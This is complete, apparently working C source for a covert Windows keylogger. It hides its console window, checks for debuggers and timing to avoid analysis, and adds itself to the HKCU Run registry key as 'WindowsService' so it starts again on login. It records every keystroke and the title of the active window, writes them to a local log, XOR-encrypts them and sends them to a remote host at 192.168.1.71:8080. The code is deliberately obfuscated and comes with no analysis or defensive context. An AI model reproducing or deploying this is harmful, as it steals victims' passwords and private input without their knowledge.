#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdbool.h>
#include <winreg.h>
#include <shlobj.h>
#include <time.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")

#define A1 0x5F
#define B2 0x3D
#define C3 0x2A
#define D4 0x1E

unsigned char s1[] = {0x72,0x65,0x67,0x73,0x76,0x72,0x33,0x32,0x00};
unsigned char s2[] = {0x61,0x64,0x76,0x61,0x70,0x69,0x33,0x32,0x00};
unsigned char s3[] = {0x57,0x69,0x6E,0x64,0x6F,0x77,0x73,0x53,0x65,0x72,0x76,0x69,0x63,0x65,0x00};
unsigned char s4[] = {0x53,0x33,0x63,0x72,0x33,0x74,0x4B,0x33,0x79,0x00};
unsigned char s5[] = {0x6B,0x65,0x79,0x73,0x74,0x72,0x6F,0x6B,0x65,0x73,0x2E,0x6C,0x6F,0x67,0x00};

typedef struct { int x; int y; } XY;
XY f1() { XY r = {A1|B2, C3^D4}; return r; }

void f2() { if (IsDebuggerPresent()) ExitProcess(1); DWORD t=GetTickCount();Sleep(100);if((GetTickCount()-t)<100)ExitProcess(1); }
void f3() { HWND h=GetConsoleWindow(); if(h)ShowWindow(h,SW_HIDE); }

void f4(char*d,int l){int k=strlen(s4);for(int i=0;i<l;i++)d[i]^=s4[i%k];}

SOCKET f5() {
    WSADATA w; SOCKET s=INVALID_SOCKET; struct sockaddr_in sv;
    if(WSAStartup(MAKEWORD(2,2),&w)!=0)return INVALID_SOCKET;
    if((s=socket(AF_INET,SOCK_STREAM,0))==INVALID_SOCKET){WSACleanup();return INVALID_SOCKET;}
    sv.sin_family=AF_INET; sv.sin_port=htons(8080); sv.sin_addr.s_addr=inet_addr("192.168.1.71");
    if(connect(s,(struct sockaddr*)&sv,sizeof(sv))<0){closesocket(s);WSACleanup();return INVALID_SOCKET;}
    return s;
}

void f6(char*b,size_t z){time_t n;time(&n);struct tm*t=localtime(&n);strftime(b,z,"[%H:%M:%S]",t);}

char b1[1024*10]={0}; size_t p1=0; char w1[256]={0};

void f7(SOCKET s) {
    char t[256]={0}; HWND f=GetForegroundWindow();
    if(f&&GetWindowText(f,t,sizeof(t))){
        if(strcmp(w1,t)!=0){
            char b[512]; char ts[32]; f6(ts,sizeof(ts));
            int l=sprintf(b,"\n%s [Window: %s]\n",ts,t);
            f4(b,l); send(s,b,l,0); strcpy(w1,t);
        }
    }
}

void f8() {
    char pt[MAX_PATH];
    if(GetModuleFileName(NULL,pt,MAX_PATH)){
        HKEY h; XY xy = f1();
        if(RegOpenKeyEx(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,xy.x,&h)==ERROR_SUCCESS){
            RegSetValueEx(h,s3,0,REG_SZ,(BYTE*)pt,strlen(pt)+1);
            RegCloseKey(h);
        }
    }
}

void f9(const char*d){FILE*f=fopen(s5,"a");if(f){fputs(d,f);fclose(f);}}
void f10(const char*d){size_t l=strlen(d);if(p1+l<sizeof(b1)){strcat(b1+p1,d);p1+=l;}f9(d);}

void f11(SOCKET s){if(p1>0){f4(b1,p1);send(s,b1,p1,0);memset(b1,0,sizeof(b1));p1=0;}}

int WINAPI WinMain(HINSTANCE a,HINSTANCE b,LPSTR c,int d) {
    f2(); f3(); SetPriorityClass(GetCurrentProcess(),64); f8();
    SOCKET s; bool k[256]={0}; bool ic=0; DWORD lca=0;
    while(1){
        for(int i=8;i<=190;i++){
            if((GetAsyncKeyState(i)&0x8000)&&!k[i]){
                char ks[20]={0};
                if(i>=65&&i<=90)sprintf(ks,"%c",i+32);
                else if(i>=48&&i<=57)sprintf(ks,"%c",i);
                else switch(i){
                    case 32:strcpy(ks," ");break;
                    case 13:strcpy(ks,"[ENTER]\n");break;
                    case 9:strcpy(ks,"[TAB]");break;
                    case 16:strcpy(ks,"[SHIFT]");break;
                    case 8:strcpy(ks,"\b");break;
                    case 27:strcpy(ks,"[ESC]");break;
                    case 17:strcpy(ks,"[CTRL]");break;
                    case 91:case 92:strcpy(ks,"[WIN]");break;
                    case 18:strcpy(ks,"[ALT]");break;
                    case 20:strcpy(ks,"[CAPSLOCK]");break;
                    case 46:strcpy(ks,"[DELETE]");break;
                    case 45:strcpy(ks,"[INSERT]");break;
                    case 36:strcpy(ks,"[HOME]");break;
                    case 35:strcpy(ks,"[END]");break;
                    case 37:strcpy(ks,"[LEFT]");break;
                    case 39:strcpy(ks,"[RIGHT]");break;
                    case 38:strcpy(ks,"[UP]");break;
                    case 40:strcpy(ks,"[DOWN]");break;
                    case 186:strcpy(ks,";");break;
                    case 222:strcpy(ks,"'");break;
                    case 188:strcpy(ks,",");break;
                    case 190:strcpy(ks,".");break;
                    case 189:strcpy(ks,"-");break;
                    case 187:strcpy(ks,"+");break;
                    case 191:strcpy(ks,"/");break;
                    case 192:strcpy(ks,"`");break;
                    case 219:strcpy(ks,"[");break;
                    case 220:strcpy(ks,"\\");break;
                    case 221:strcpy(ks,"]");break;
                    default:continue;
                }
                f10(ks);
                if(ic){int l=strlen(ks);f4(ks,l);if(send(s,ks,l,0)==SOCKET_ERROR){closesocket(s);WSACleanup();ic=0;}}
                k[i]=1;
            }
            if(!(GetAsyncKeyState(i)&0x8000))k[i]=0;
        }
        DWORD n=GetTickCount();
        if(!ic&&(n-lca>10000)){
            s=f5();
            if(s!=INVALID_SOCKET){ic=1;f11(s);f7(s);}
            lca=n;
        }
        else if(ic)f7(s);
        Sleep(10);
    }
    return 0;
}